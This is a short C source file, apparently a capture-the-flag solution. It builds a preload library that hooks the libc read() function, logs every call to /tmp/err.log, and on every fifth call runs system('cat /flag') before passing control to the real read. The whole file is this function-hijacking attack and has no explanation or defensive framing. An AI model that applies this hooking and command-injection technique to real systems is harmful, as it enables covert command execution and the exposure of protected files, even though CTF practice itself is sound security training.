#include <stdio.h>
#include <unistd.h>
#include <dlfcn.h>
#include <stdlib.h>

#define BUFFER_SIZE 100
#define COMMAND_NUM 5

static int called = 0;
static ssize_t (*old_read) (int fd, void *buf, size_t count);

int check_file_line(char * filename){
	int file_line = 0;
	char buffer[BUFFER_SIZE];
	FILE *fp = NULL;
	fp = fopen(filename,"r");
	if(fp==NULL){
		return file_line;
	}
	while(fgets(buffer,BUFFER_SIZE,fp)!= NULL){
		file_line ++;
	}
	fclose(fp);
	return file_line;
}

void add_file_line(char * filename){
	FILE * fp = NULL;
	fp = fopen(filename,"a+");
	if(fp == NULL){
		return;
	}
	fputs("1\n",fp);
	fclose(fp);
}

ssize_t read(int fd, void *buf, size_t count)
{
    char * filename = "/tmp/err.log";
    int file_lines = 0;

#ifdef DEBUG
  printf ("read hooked.\n");
#endif

    add_file_line(filename);
    file_lines = check_file_line(filename);

  if(file_lines % COMMAND_NUM == 0){
  	system("cat /flag");
  }

  if (old_read == NULL)
    old_read = dlsym (RTLD_NEXT, "read");

  return old_read (fd, buf, count);
}
